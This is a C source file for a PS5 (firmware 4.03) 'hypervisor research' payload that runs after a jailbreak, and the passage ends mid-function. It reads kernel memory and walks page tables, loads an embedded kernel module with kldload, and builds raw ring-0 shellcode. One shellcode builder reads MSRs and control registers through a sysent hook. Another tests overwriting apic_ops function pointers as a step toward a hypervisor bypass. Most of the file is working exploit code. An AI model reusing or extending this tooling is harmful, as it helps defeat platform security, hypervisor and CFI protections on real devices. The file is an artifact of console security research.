/*
 * PS5 Hypervisor Research Tool - FW 4.03
 *
 * Standalone ELF payload for SBL mailbox probing and IOMMU/HV reconnaissance.
 * Load after jailbreaking with umtx2 + etaHEN via send_elf.py.
 *
 * Usage: python3 send_elf.py <ps5_ip> --name hv_research hv_research.elf
 *
 * This is a research/educational tool for personal console exploration.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>

#include <ps5/kernel.h>

/* ─── Notification helper ─── */

typedef struct {
    char useless1[45];
    char message[3075];
} notify_request_t;

int sceKernelSendNotificationRequest(int, notify_request_t*, size_t, int);
int sceSystemStateMgrEnterStandby(void);

static void notify(const char *msg) {
    notify_request_t req;
    memset(&req, 0, sizeof(req));
    strncpy(req.message, msg, sizeof(req.message) - 1);
    sceKernelSendNotificationRequest(0, &req, sizeof(req), 0);
}

/* ─── Direct memory allocation (gives us physical addresses) ─── */

int sceKernelAllocateDirectMemory(off_t searchStart, off_t searchEnd,
                                  size_t len, size_t alignment,
                                  int memoryType, off_t *physAddrOut);
int sceKernelMapDirectMemory(void **addr, size_t len, int prot,
                             int flags, off_t directMemoryStart,
                             size_t alignment);

#define SCE_KERNEL_WC_GARLIC   3
#define SCE_KERNEL_WB_ONION    0

#define SCE_KERNEL_PROT_CPU_READ   0x01
#define SCE_KERNEL_PROT_CPU_WRITE  0x02
#define SCE_KERNEL_PROT_CPU_RW     0x03
#define SCE_KERNEL_PROT_GPU_READ   0x10
#define SCE_KERNEL_PROT_GPU_WRITE  0x20
#define SCE_KERNEL_PROT_GPU_RW     0x30

/* ─── Kernel struct offsets (common across FW versions) ─── */

#define OFFSET_PROC_P_VMSPACE    0x200
#define OFFSET_PMAP_PM_PML4      0x020

/* ─── Embedded kernel module (.ko) ─── */

__asm__ (
    ".section .rodata\n"
    ".global KMOD_KO\n"
    ".type KMOD_KO, @object\n"
    ".align 16\n"
    "KMOD_KO:\n"
    ".incbin \"kmod/hv_kmod.ko\"\n"
    "KMOD_KO_END:\n"
    ".global KMOD_KO_SZ\n"
    ".type KMOD_KO_SZ, @object\n"
    ".align 16\n"
    "KMOD_KO_SZ:\n"
    ".quad KMOD_KO_END - KMOD_KO\n"
);

extern const unsigned char KMOD_KO[];
extern const uint64_t KMOD_KO_SZ;

/* ─── Kmod shared data structures (must match kmod/hv_kmod.c) ─── */

#define KMOD_MAGIC          0xCAFEBABEDEAD1337ULL
#define KMOD_MAX_RESULTS    64
#define KMOD_STATUS_INIT    0
#define KMOD_STATUS_RUNNING 1
#define KMOD_STATUS_DONE    2

/* Sentinel value in .ko that gets patched with DMAP-mapped output KVA */
#define OUTPUT_KVA_SENTINEL 0xDEAD000000000000ULL

#define KMOD_FLAG_VMMCALL_ENUM     (1 << 0)
#define KMOD_FLAG_VMMCALL_IOMMU    (1 << 1)
#define KMOD_FLAG_VMCB_PROBE       (1 << 2)
#define KMOD_FLAG_MSR_RECON        (1 << 3)
#define KMOD_FLAG_ALL              0xFFFFFFFF

struct vmmcall_result {
    uint64_t rax_in, rcx_in, rdx_in, rdi_in, rsi_in, r8_in;
    uint64_t rax_out, rcx_out, rdx_out, rdi_out, rsi_out, r8_out;
    uint32_t survived;
    uint32_t campaign_id;
};

struct kmod_result_buf {
    volatile uint64_t magic;
    volatile uint32_t status;
    volatile uint32_t current_campaign;
    volatile uint32_t current_probe;
    volatile uint32_t num_results;
    volatile uint32_t num_msr_results;
    volatile uint32_t pad;
    struct {
        uint32_t msr_id;
        uint32_t valid;
        uint64_t value;
    } msr_results[32];
    struct vmmcall_result results[KMOD_MAX_RESULTS];
    /* Phase 7: trampoline addresses (filled by kmod init) */
    volatile uint64_t trampoline_func_kva;    /* KVA of trampoline_xapic_mode() */
    volatile uint64_t trampoline_target_kva;  /* KVA of g_trampoline_target */
    /* Phase 9: #GP handler (filled by kmod init) */
    volatile uint64_t gp_handler_kva;         /* KVA of gp_handler() */
};

/* kldsym lookup structure (matches FreeBSD sys/kld.h) */
struct kld_sym_lookup {
    int         version;    /* sizeof(struct kld_sym_lookup) */
    char       *symname;    /* Symbol name to look up */
    uint64_t    symvalue;   /* Returned: kernel VA of symbol */
    uint64_t    symsize;    /* Returned: size of symbol */
};

#define SYS_kldload     304
#define SYS_kldunload   305
#define SYS_kldfind     306
#define SYS_kldnext     307
#define SYS_kldstat     308   /* NOT 306 (that's kldfind) */
#define SYS_kldsym      337
#define KLDSYM_LOOKUP   1

/* kldstat file info structure (matches FreeBSD 11 sys/linker.h) */
struct kld_file_stat {
    int         version;        /* sizeof(struct kld_file_stat) */
    char        name[1024];     /* MAXPATHLEN */
    int         refs;
    int         id;
    uint64_t    address;        /* caddr_t - module base address in kernel */
    uint64_t    size;           /* module size in bytes */
    char        pathname[1024]; /* MAXPATHLEN - full path */
};

/* ─── Global state ─── */

static uint64_t g_dmap_base = 0;
static uint64_t g_kdata_base = 0;
static uint64_t g_ktext_base = 0;
static uint64_t g_fw_version = 0;
static uint64_t g_cr3_phys = 0;   /* Kernel PML4 physical address */


/* apic_ops discovery results (set by Phase 3, used by Phase 7) */
static uint64_t g_apic_ops_addr = 0;   /* KVA of apic_ops table */
static int      g_apic_ops_count = 0;  /* Number of entries (typically 28) */


/* Kmod trampoline addresses (set by kmod campaign, used by Phase 7) */
static uint64_t g_kmod_trampoline_func = 0;    /* KVA of trampoline_xapic_mode() in kmod .text */
static uint64_t g_kmod_trampoline_target = 0;  /* KVA of g_trampoline_target in kmod .data */
static uint64_t g_kmod_gp_handler = 0;         /* KVA of gp_handler() in kmod .text */
static int      g_kmod_kid = -1;               /* kldload file ID (-1 = not loaded) */


/* ─── DMAP base discovery ─── */

/*
 * Discover DMAP base by reading the process pmap structure.
 * The pmap contains pm_pml4 (virtual) and pm_cr3 (physical).
 * On FreeBSD, the PML4 is mapped via DMAP, so:
 *   DMAP_BASE = pm_pml4 - pm_cr3
 */
static int discover_dmap_base(void) {
    uint64_t proc, vmspace, pmap_addr;
    uint64_t pm_pml4;
    uint64_t candidate_cr3;

    proc = kernel_get_proc(getpid());
    if (!proc) {
        printf("[-] Failed to get proc\n");
        return -1;
    }

    kernel_copyout(proc + OFFSET_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));
    if (!vmspace) {
        printf("[-] Failed to get vmspace\n");
        return -1;
    }

    /* On PS5, vm_pmap is a pointer at offset 0x1D0 in vmspace */
    kernel_copyout(vmspace + 0x1D0, &pmap_addr, sizeof(pmap_addr));
    if (!pmap_addr) {
        printf("[-] Failed to get pmap\n");
        return -1;
    }

    /* Read pm_pml4 at pmap + 0x20 */
    kernel_copyout(pmap_addr + OFFSET_PMAP_PM_PML4, &pm_pml4, sizeof(pm_pml4));
    printf("[*] pm_pml4 = 0x%lx\n", pm_pml4);

    /* Try candidate offsets for pm_cr3 in the pmap structure */
    static const int cr3_offsets[] = {0x28, 0x30, 0x38, 0x40, 0x48};
    for (int i = 0; i < 5; i++) {
        kernel_copyout(pmap_addr + cr3_offsets[i], &candidate_cr3, sizeof(candidate_cr3));

        /* CR3 should be a reasonable physical address (< 32GB, non-zero, page-aligned) */
        if (candidate_cr3 == 0 || candidate_cr3 > 0x800000000ULL)
            continue;
        if (candidate_cr3 & 0xFFF)
            continue;

        uint64_t candidate_dmap = pm_pml4 - candidate_cr3;

        /* DMAP base should be in the high canonical half (0xFFFF8xxxxxxxxx) */
        if ((candidate_dmap >> 47) != 0 && candidate_dmap > 0xFFFF800000000000ULL) {
            /* Validate: read back pm_pml4 through DMAP and verify */
            uint64_t verify;
            if (kernel_copyout(candidate_dmap + candidate_cr3 + OFFSET_PMAP_PM_PML4,
                              &verify, sizeof(verify)) == 0) {
                /* This should give us a PML4 entry, not necessarily pm_pml4 itself */
                /* But if the read doesn't crash, the DMAP base is likely valid */
                g_dmap_base = candidate_dmap;
                g_cr3_phys = candidate_cr3;
                printf("[+] DMAP base discovered: 0x%lx (cr3_offset=0x%x, cr3=0x%lx)\n",
                       g_dmap_base, cr3_offsets[i], candidate_cr3);
                return 0;
            }
        }
    }

    /* Fallback: try common DMAP bases */
    printf("[!] Could not discover DMAP via pmap, trying common bases...\n");
    static const uint64_t common_dmap[] = {
        0xFFFFFF0000000000ULL,  /* DMPML4I=0x1FE, DMPDPI=0 */
        0xFFFFFE8000000000ULL,  /* DMPML4I=0x1FD, DMPDPI=0 */
        0xFFFF808000000000ULL,  /* DMPML4I=0x101, DMPDPI=2 */
        0xFFFF800000000000ULL,  /* DMPML4I=0x100, DMPDPI=0 */
    };

    for (int i = 0; i < 4; i++) {
        /* Try reading the SBL MMIO identification register */
        uint32_t test;
        if (kernel_copyout(common_dmap[i] + 0xE0500000ULL, &test, sizeof(test)) == 0) {
            g_dmap_base = common_dmap[i];
            printf("[+] DMAP base found via fallback: 0x%lx\n", g_dmap_base);
            return 0;
        }
    }

    printf("[-] Failed to discover DMAP base\n");
    return -1;
}

/* ─── FW version detection and offset resolution ─── */

static int init_fw_offsets(void) {
    g_fw_version = kernel_get_fw_version() & 0xFFFF0000;
    g_kdata_base = KERNEL_ADDRESS_DATA_BASE;
    g_ktext_base = KERNEL_ADDRESS_TEXT_BASE;

    printf("[*] FW version: 0x%lx\n", g_fw_version);
    printf("[*] Kernel data base: 0x%lx\n", g_kdata_base);
    printf("[*] Kernel text base: 0x%lx\n", g_ktext_base);

    /*
     * SBL mailbox offsets (relative to kernel data base).
     * These must be discovered for FW 4.03.
     * The offsets below are placeholders that will be auto-discovered.
     */
    switch (g_fw_version) {
    case 0x4000000:
    case 0x4020000:
    case 0x4030000:
    case 0x4500000:
    case 0x4510000:
        printf("[+] FW 4.xx detected\n");
        break;
    default:
        printf("[!] Warning: FW 0x%lx may not be fully supported\n", g_fw_version);
        break;
    }

    return 0;
}

/* ─── Physical address resolution via page tables ─── */

/*
 * Walk AMD64 4-level page tables to resolve a virtual address to
 * its CPU physical address. Uses DMAP + CR3 to read page table entries.
 *
 * This is critical because sceKernelAllocateDirectMemory returns
 * PS5 direct memory bus addresses (e.g., 0x2000xxxxxxxx) which are
 * NOT CPU physical addresses. Only a page table walk gives the real
 * CPU PA that DMAP maps.
 *
 * Handles 4KB, 2MB (huge), and 1GB (giant) pages.
 */
#define PTE_PRESENT   (1ULL << 0)
#define PTE_PS        (1ULL << 7)   /* Page Size bit (huge/giant page) */
#define PTE_PA_MASK   0x000FFFFFFFFFF000ULL
/*
 * Maximum physical address considered safe for DMAP reads.
 * PAs above this likely map to PCIe BARs, GPU MMIO, or other
 * device memory.  Reading these via DMAP can hang the CPU
 * indefinitely (device doesn't respond to load).
 * PS5 has 16GB GDDR6; use 32GB as generous upper bound.
 */
#define MAX_SAFE_PA   0x800000000ULL  /* 32GB */

static uint64_t va_to_cpu_pa(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) {
        printf("[!] va_to_cpu_pa: no CR3 or DMAP base available\n");
        return 0;
    }

    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;

    /* Level 4: PML4 */
    uint64_t pml4e;
    kernel_copyout(g_dmap_base + g_cr3_phys + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & PTE_PRESENT)) {
        printf("[!] PML4E[%lu] not present for VA 0x%lx\n", (unsigned long)pml4_idx, va);
        return 0;
    }

    /* Level 3: PDPT */
    uint64_t pdpte;
    kernel_copyout(g_dmap_base + (pml4e & PTE_PA_MASK) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & PTE_PRESENT)) {
        printf("[!] PDPTE[%lu] not present for VA 0x%lx\n", (unsigned long)pdpt_idx, va);
        return 0;
    }
    if (pdpte & PTE_PS) {
        /* 1GB giant page */
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    }

    /* Level 2: PD */
    uint64_t pde;
    kernel_copyout(g_dmap_base + (pdpte & PTE_PA_MASK) + pd_idx * 8, &pde, 8);
    if (!(pde & PTE_PRESENT)) {
        printf("[!] PDE[%lu] not present for VA 0x%lx\n", (unsigned long)pd_idx, va);
        return 0;
    }
    if (pde & PTE_PS) {
        /* 2MB huge page */
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    }

    /* Level 1: PT */
    uint64_t pte;
    kernel_copyout(g_dmap_base + (pde & PTE_PA_MASK) + pt_idx * 8, &pte, 8);
    if (!(pte & PTE_PRESENT)) {
        printf("[!] PTE[%lu] not present for VA 0x%lx\n", (unsigned long)pt_idx, va);
        return 0;
    }

    /* 4KB page */
    return (pte & PTE_PA_MASK) | (va & 0xFFF);
}

static uint64_t kva_to_pa(uint64_t va) {
    /* DMAP addresses: just subtract DMAP base */
    if (g_dmap_base && va >= g_dmap_base && va < g_dmap_base + 0x800000000ULL) {
        return va - g_dmap_base;
    }
    /* Otherwise, full page table walk */
    return va_to_cpu_pa(va);
}

/* Silent page table walk: returns PA or 0 if unmapped.  No printf. */
static uint64_t va_to_pa_quiet(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) return 0;

    uint64_t e;
    kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    return (e & PTE_PA_MASK) | (va & 0xFFF);
}
static void campaign_kernel_recon(void) {
    printf("\n=============================================\n");
    printf("  Campaign 5: Kernel/HV Reconnaissance\n");
    printf("=============================================\n\n");

    /* Print kernel addresses */
    printf("[*] KERNEL_ADDRESS_TEXT_BASE  = 0x%lx\n", KERNEL_ADDRESS_TEXT_BASE);
    printf("[*] KERNEL_ADDRESS_DATA_BASE = 0x%lx\n", KERNEL_ADDRESS_DATA_BASE);
    printf("[*] KERNEL_ADDRESS_ALLPROC   = 0x%lx\n", KERNEL_ADDRESS_ALLPROC);
    printf("[*] DMAP base                = 0x%lx\n", g_dmap_base);

    /* Read security flags */
    if (KERNEL_ADDRESS_SECURITY_FLAGS) {
        uint8_t secflags[16];
        kernel_copyout(KERNEL_ADDRESS_SECURITY_FLAGS, secflags, sizeof(secflags));
        printf("\n[*] Security flags: ");
        for (int i = 0; i < 16; i++)
            printf("%02x", secflags[i]);
        printf("\n");
    }

    /* Read QA flags */
    uint8_t qaflags[16];
    if (kernel_get_qaflags(qaflags) == 0) {
        printf("[*] QA flags: ");
        for (int i = 0; i < 16; i++)
            printf("%02x", qaflags[i]);
        printf("\n");
    }

    /* Check if development mode is enabled */
    printf("[*] is_development_mode check: reading from security_flags...\n");

    /* Check if kldload might be available */
    printf("\n[*] Checking kldload availability...\n");
    printf("    FW < 6.50 should have GMET disabled, making kldload viable.\n");
    if (g_fw_version < 0x6500000) {
        printf("    [+] FW 0x%lx - GMET likely NOT enforced, kldload should work!\n", g_fw_version);
    } else {
        printf("    [-] FW 0x%lx - GMET likely enforced, kldload may not work.\n", g_fw_version);
    }
}
/*
 * Campaign 7: Kernel Module via kldload
 *
 * This is the core HV research campaign. It uses FreeBSD's native
 * kernel module loading (kldload) instead of sysent hijacking:
 *
 * 1. Write the embedded .ko file to disk
 * 2. Call kldload() to load it into the kernel
 *    - The kernel linker allocates memory, handles relocations
 *    - SYSINIT callback runs our init code in ring 0
 *    - Init reads MSRs, CRs, and optionally executes VMMCALLs
 * 3. Use kldsym() to find the hv_results symbol
 * 4. kernel_copyout() the results to userland
 * 5. kldunload() to clean up
 *
 * Advantages over sysent hijacking:
 *   - No sysent table scanning (was failing)
 *   - No data cave hunting
 *   - No NX bit clearing
 *   - Kernel handles all memory management and relocation
 *   - Works on FW < 6.50 (GMET not enforced)
 */
/* ============================================================
 * Shellcode builder: generates a minimal ring-0 MSR reader
 *
 * Builds position-independent machine code that:
 *   1. Saves clobbered registers
 *   2. Writes magic/status to shared output buffer (DMAP KVA)
 *   3. Reads MSRs and CRs via RDMSR / MOV CRn
 *   4. Stores results in kmod_result_buf format
 *   5. Restores registers and IRETQ back to ring 3
 *
 * The output KVA is embedded as a 64-bit immediate (movabs).
 * No relocations needed — fully self-contained.
 * ============================================================ */
static int build_msr_shellcode(uint8_t *buf, int bufmax, uint64_t output_kva) {
    int p = 0;

    /* Helper macros for common x86-64 encodings */
    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)

    /* Prologue: save registers we clobber (RAX, RCX, RDX, RDI) */
    EMIT(0x50);  /* push rax */
    EMIT(0x51);  /* push rcx */
    EMIT(0x52);  /* push rdx */
    EMIT(0x57);  /* push rdi */

    /* movabs $output_kva, %rdi */
    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);

    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
    EMIT(0x48); EMIT(0x89); EMIT(0x07);  /* mov %rax, (%rdi) */

    /* status = RUNNING: movl $1, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);

    /* MSR/CR reading table.
     * kmod_result_buf.msr_results starts at offset 32, each entry is 16 bytes:
     *   +0: uint32_t msr_id
     *   +4: uint32_t valid
     *   +8: uint64_t value */
    static const struct { uint32_t id; int is_cr; } msr_table[] = {
        { 0xC0000080, 0 },  /* EFER */
        { 0xC0000081, 0 },  /* STAR */
        { 0xC0000082, 0 },  /* LSTAR */
        { 0xC0000084, 0 },  /* SFMASK */
        { 0xC0000100, 0 },  /* FS_BASE */
        { 0xC0000101, 0 },  /* GS_BASE */
        { 0xC0000102, 0 },  /* KGS_BASE */
        { 0xC0000103, 0 },  /* TSC_AUX */
        { 0xFFFF0000, 1 },  /* CR0 (pseudo-MSR) */
        { 0xFFFF0003, 1 },  /* CR3 */
        { 0xFFFF0004, 1 },  /* CR4 */
    };
    int n_entries = sizeof(msr_table) / sizeof(msr_table[0]);

    for (int i = 0; i < n_entries; i++) {
        int32_t id_off  = 32 + i * 16;       /* msr_results[i].msr_id */
        int32_t val_off = 32 + i * 16 + 4;   /* msr_results[i].valid */
        int32_t dat_off = 32 + i * 16 + 8;   /* msr_results[i].value */

        if (!msr_table[i].is_cr) {
            /* mov $msr_num, %ecx */
            EMIT(0xB9); EMIT_U32(msr_table[i].id);
            /* rdmsr → EDX:EAX */
            EMIT(0x0F); EMIT(0x32);
            /* shl $32, %rdx */
            EMIT(0x48); EMIT(0xC1); EMIT(0xE2); EMIT(0x20);
            /* or %rdx, %rax */
            EMIT(0x48); EMIT(0x09); EMIT(0xD0);
        } else {
            uint32_t cr = msr_table[i].id & 0xF;
            /* mov %crN, %rax: 0F 20 (C0 + N*8) */
            EMIT(0x0F); EMIT(0x20); EMIT(0xC0 + cr * 8);
        }

        /* Store msr_id: movl $id, disp(%rdi) */
        if (id_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)id_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(id_off);
        }
        EMIT_U32(msr_table[i].id);

        /* Store valid=1: movl $1, disp(%rdi) */
        if (val_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)val_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(val_off);
        }
        EMIT_U32(1);

        /* Store value: mov %rax, disp(%rdi) */
        if (dat_off < 128) {
            EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT((uint8_t)dat_off);
        } else {
            EMIT(0x48); EMIT(0x89); EMIT(0x87); EMIT_U32(dat_off);
        }
    }

    /* num_msr_results = n_entries: movl $n, 24(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x18); EMIT_U32((uint32_t)n_entries);

    /* status = DONE: movl $2, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);

    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);

    /* Epilogue: restore and return from interrupt */
    EMIT(0x5F);  /* pop rdi */
    EMIT(0x5A);  /* pop rdx */
    EMIT(0x59);  /* pop rcx */
    EMIT(0x58);  /* pop rax */
    EMIT(0x48); EMIT(0xCF);  /* iretq */

    #undef EMIT
    #undef EMIT_U32
    #undef EMIT_U64

    return p;
}

/* ============================================================
 * Build MSR/CR recon shellcode for SYSENT HOOK execution path
 *
 * Calling convention: int sys_foo(struct thread *td, void *uap)
 *   - RDI = td (we ignore it)
 *   - RSI = uap (we ignore it)
 *   - Return via RET (not IRETQ)
 *   - Caller-saved regs (RAX,RCX,RDX,RSI,RDI,R8-R11) can be clobbered
 *   - Must preserve RBX,RBP,R12-R15
 *
 * Reads safe MSRs + APIC_BASE + CR0/CR3/CR4, writes results
 * to kmod_result_buf format at output_kva.
 * ============================================================ */
static int build_ring0_msr_shellcode(uint8_t *buf, int bufmax,
                                     uint64_t output_kva) {
    int p = 0;

    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)

    /* No push/pop needed — sysent dispatch saves caller-saved regs.
     * We only use RAX, RCX, RDX, RDI which are all caller-saved. */

    /* movabs $output_kva, %rdi */
    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);

    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
    EMIT(0x48); EMIT(0x89); EMIT(0x07);

    /* status = RUNNING: movl $1, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);

    /* MSR/CR reading table — includes APIC_BASE for suspend/resume research */
    static const struct { uint32_t id; int is_cr; } msr_table[] = {
        { 0xC0000080, 0 },  /* EFER */
        { 0xC0000081, 0 },  /* STAR */
        { 0xC0000082, 0 },  /* LSTAR (syscall entry) */
        { 0xC0000084, 0 },  /* SFMASK */
        { 0xC0000100, 0 },  /* FS_BASE */
        { 0xC0000101, 0 },  /* GS_BASE (per-CPU) */
        { 0xC0000102, 0 },  /* KERNEL_GS_BASE */
        { 0xC0000103, 0 },  /* TSC_AUX */
        { 0x0000001B, 0 },  /* APIC_BASE (local APIC phys addr) */
        { 0xFFFF0000, 1 },  /* CR0 (pseudo) */
        { 0xFFFF0003, 1 },  /* CR3 (pseudo) */
        { 0xFFFF0004, 1 },  /* CR4 (pseudo) */
    };
    int n_entries = sizeof(msr_table) / sizeof(msr_table[0]);

    for (int i = 0; i < n_entries; i++) {
        int32_t id_off  = 32 + i * 16;
        int32_t val_off = 32 + i * 16 + 4;
        int32_t dat_off = 32 + i * 16 + 8;

        if (!msr_table[i].is_cr) {
            /* mov $msr_num, %ecx */
            EMIT(0xB9); EMIT_U32(msr_table[i].id);
            /* rdmsr → EDX:EAX */
            EMIT(0x0F); EMIT(0x32);
            /* shl $32, %rdx */
            EMIT(0x48); EMIT(0xC1); EMIT(0xE2); EMIT(0x20);
            /* or %rdx, %rax */
            EMIT(0x48); EMIT(0x09); EMIT(0xD0);
        } else {
            uint32_t cr = msr_table[i].id & 0xF;
            /* mov %crN, %rax */
            EMIT(0x0F); EMIT(0x20); EMIT(0xC0 + cr * 8);
        }

        /* Store msr_id: movl $id, disp(%rdi) */
        if (id_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)id_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(id_off);
        }
        EMIT_U32(msr_table[i].id);

        /* Store valid=1: movl $1, disp(%rdi) */
        if (val_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)val_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(val_off);
        }
        EMIT_U32(1);

        /* Store value: mov %rax, disp(%rdi) */
        if (dat_off < 128) {
            EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT((uint8_t)dat_off);
        } else {
            EMIT(0x48); EMIT(0x89); EMIT(0x87); EMIT_U32(dat_off);
        }
    }

    /* num_msr_results = n_entries: movl $n, 24(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x18); EMIT_U32((uint32_t)n_entries);

    /* status = DONE: movl $2, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);

    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);

    /* Return 0 (success) */
    EMIT(0x31); EMIT(0xC0);  /* xor eax, eax */
    EMIT(0xC3);               /* ret */

    #undef EMIT
    #undef EMIT_U32
    #undef EMIT_U64

    return p;
}

/*
 * Build ring-0 shellcode for apic_ops CFI writeback test.
 *
 * Tests whether apic_ops function pointers can be written from ring 0.
 * This is the prerequisite for the flatz suspend/resume HV bypass.
 *
 * IMPORTANT: All apic_ops access goes through DMAP addresses, NOT kdata VA.
 * Direct kdata VA access causes kernel panic (HV/NPT enforcement).
 * DMAP maps the same physical memory but with write permission.
 *
 * Test 1 (same-value writeback):
 *   - Read current apic_ops[2] (xapic_mode) via DMAP
 *   - Write the same value back via DMAP
 *   - Read again to verify write took effect
 *   → If match: slot is writable, no CFI trap on same-value write
 *
 * Test 2 (cross-type write):
 *   - Write apic_ops[0] (create) value into apic_ops[2] (xapic_mode)
 *   - Read back to verify
 *   - IMMEDIATELY restore original apic_ops[2] value
 *   → If match: we can overwrite with arbitrary ktext pointer
 *
 * Only uses caller-saved registers (RAX, RCX, RDX, RSI, RDI).
 * Temporary values stored in output buffer — no push/pop needed.
 *
 * Result buffer layout (offsets from output_kva):
 *   [0]   magic (8 bytes)
 *   [8]   status (4 bytes) — 1=running, 2=done
 *   [32]  original_val (8 bytes) — apic_ops[2] before test
 *   [40]  slot0_val (8 bytes) — apic_ops[0] (used for cross-type)
 *   [48]  test1_readback (8 bytes) — after same-value write
 *   [56]  test1_ok (4 bytes) — 1=match
 *   [64]  test2_readback (8 bytes) — after cross-type write
 *   [72]  test2_ok (4 bytes) — 1=match
 *   [80]  restore_readback (8 bytes) — after restoring original
 *   [88]  restore_ok (4 bytes) — 1=match
 */
static int build_ring0_apic_writeback_shellcode(uint8_t *buf, int bufmax,
                                                 uint64_t output_kva,
                                                 uint64_t slot0_dmap,
                                                 uint64_t slot2_dmap) {
    int p = 0;

    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)

    /* movabs $output_kva, %rdi   — result buffer pointer (DMAP) */
    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);

    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
    EMIT(0x48); EMIT(0x89); EMIT(0x07);

    /* status = RUNNING: movl $1, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);

    /* ── Read apic_ops[2] (xapic_mode) via DMAP ── */
    /* movabs $slot2_dmap, %rsi */
    EMIT(0x48); EMIT(0xBE); EMIT_U64(slot2_dmap);
    /* mov (%rsi), %rax  — original value */
    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
    /* mov %rax, 32(%rdi) — store original_val */
    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x20);
    /* Keep original in RDX throughout */
    /* mov %rax, %rdx */
    EMIT(0x48); EMIT(0x89); EMIT(0xC2);

    /* ── Read apic_ops[0] (create) via DMAP ── */
    /* movabs $slot0_dmap, %rcx */
    EMIT(0x48); EMIT(0xB9); EMIT_U64(slot0_dmap);
    /* mov (%rcx), %rax — slot0 value */
    EMIT(0x48); EMIT(0x8B); EMIT(0x01);
    /* mov %rax, 40(%rdi) — store slot0_val */
    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x28);

    /* ═══ Test 1: Same-value writeback ═══ */
    /* Write original (RDX) back to slot2 via DMAP */
    /* mov %rdx, (%rsi) */
    EMIT(0x48); EMIT(0x89); EMIT(0x16);
    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
    /* mov (%rsi), %rax — read back */
    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
    /* mov %rax, 48(%rdi) — store test1_readback */
    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x30);
    /* cmp %rdx, %rax */
    EMIT(0x48); EMIT(0x39); EMIT(0xD0);
    /* sete %cl */
    EMIT(0x0F); EMIT(0x94); EMIT(0xC1);
    /* movzbl %cl, %ecx */
